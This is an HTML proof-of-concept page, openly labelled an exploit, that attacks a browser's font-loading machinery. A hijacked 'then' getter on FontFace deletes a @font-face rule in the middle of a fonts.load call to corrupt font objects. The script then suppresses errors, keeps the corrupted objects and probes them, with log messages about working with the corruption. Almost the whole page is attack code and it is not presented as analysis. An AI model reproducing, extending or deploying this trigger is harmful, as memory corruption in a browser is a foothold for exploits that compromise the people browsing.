<!DOCTYPE html>
<html>
<head>
<style id="s">
@font-face { font-family: x; src: url(nonexistent-font.woff); unicode-range: U+0042; }
</style>
</head>
<body>
<div id="status" style="font-size: 20px; padding: 20px;"></div>
<script>
let statusDiv = document.getElementById('status');
function log(msg) {
    statusDiv.innerHTML += msg + '<br>';
    console.log(msg);
}

// Store corrupted objects globally so we can inspect after error
window.exploitState = {
    fonts: [],
    corrupted: false,
    error: null
};

window.onerror = function(msg) {
    log('ERROR CAUGHT: ' + msg);
    window.exploitState.error = msg;
    return true; // Prevent default error handling
};

window.onload = () => {
    log('[+] Starting exploit...');
    
    let A = new FontFace('x', 'local(Helvetica)', { unicodeRange: 'U+0041' });
    document.fonts.add(A);
    void A.loaded;
    
    window.exploitState.fonts.push(A);
    
    let fired = false;
    Object.defineProperty(FontFace.prototype, 'then', {
        configurable: true,
        get() {
            if (!fired && this === A) {
                fired = true;
                log('[+] Getter triggered - creating corruption...');
                
                // Create corruption
                let y = new FontFace('y', 'local(Helvetica Bold)', { unicodeRange: 'U+0041' });
                let z = new FontFace('z', 'local(Helvetica Italic)', { unicodeRange: 'U+0041' });
                
                window.exploitState.fonts.push(y, z);
                
                document.getElementById('s').sheet.deleteRule(0);
                document.body.offsetTop;
                
                window.exploitState.corrupted = true;
                log('[+] Corruption triggered!');
            }
            return undefined;
        }
    });
    
    log('[+] Calling fonts.load...');
    document.fonts.load('1em x', 'AB');
    
    // After error appears, this should still run
    setTimeout(() => {
        log('[*] Timeout reached');
        log('[*] Corrupted: ' + window.exploitState.corrupted);
        log('[*] Font count: ' + window.exploitState.fonts.length);
        log('[*] document.fonts.size: ' + document.fonts.size);
        
        // Try to probe the corrupted fonts
        try {
            window.exploitState.fonts.forEach((f, i) => {
                log('[*] Font ' + i + ': family=' + f.family + ', status=' + f.status);
            });
        } catch(e) {
            log('[!] Exception probing fonts: ' + e);
        }
        
        log('[+] If you see this, we can work with the corruption!');
        log('[+] Now try: javascript:alert(window.exploitState)');
        
    }, 2000);
};
</script>
</body>
</html>
